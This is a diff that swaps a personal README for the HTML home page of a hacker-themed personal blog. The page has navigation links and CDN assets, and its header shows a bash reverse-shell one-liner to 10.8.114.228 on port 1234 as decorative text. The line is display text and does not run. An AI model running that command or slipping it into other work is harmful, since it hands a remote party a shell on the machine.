@@ -1,16 +1,69 @@
-# ***_*Hey, I am Prakash Chand Thakuri*_***
-__________________________________________________
-    A Hacker 
----------------------------------------------
-    CTF player 
-----------------------------------------------
-    Security Researcher 
- ---------------------------------
-    Programmer
+<!DOCTYPE html>
+<html lang="en">
+<title>ALIEN0NE BLOG</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<link rel="stylesheet" href="css/style2.css">
+<link rel="icon" href="/images/spyware.png" type="image/x-icon">
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.1/css/all.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.11.2/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Righteous|Ubuntu+Mono&display=swap">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
+  integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
 
--------------------------------------------------
-**`email: prakashchand.pc72@gmail.com`**
-**`instagram.com/prakashchand.pc72`**
-**`LinkedIN`**(linkedin.com/in/prakash-chand-thakuri-b87b2120a/)
-**`youtube.com/ASTUTE_72`**
+<style>
+  body {
+    background-color: #000;
+  }
+</style>
 
+<body>
+  <nav class="navbar navbar-expand-lg bg-transparent fixed-top">
+    <div class="container-fluid ">
+      <a class="bar text-white " href="https://alien0ne.me/index">root@Alien0ne:~</a>
+      <button class="navbar-toggler navbar-dark" type="button" data-toggle="collapse" data-target="#navbar-nav"
+        aria-controls="navbar-nav" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon "></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbar-nav">
+        <ul class="navbar-nav ml-auto">
+          <li class="nav-item ">
+            <a class="nav-link  text-danger " href="https://alien0ne.me/index">Home</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="https://alien0ne.me/whoami">Whoami</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="https://alien0ne.digitalpress.blog/">Blog</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="https://alien0ne.me/resources">Resources</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+
+  <div class="header1 index center">
+    <p>Hi ,<br>I Am Alien0ne </p>
+    <p class="header2">bash -i >& /dev/tcp/10.8.114.228/1234 0>&1</p>
+  </div>
+
+  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
+    integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
+    crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
+    integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
+    crossorigin="anonymous"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
+    integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
+    crossorigin="anonymous"></script>
+  <script type="text/javascript" color="220,20,60" opacity='1' zIndex="-2" count="200"
+    src="/js/canvas-nest.js"></script>
+
+</body>
+
+</html>
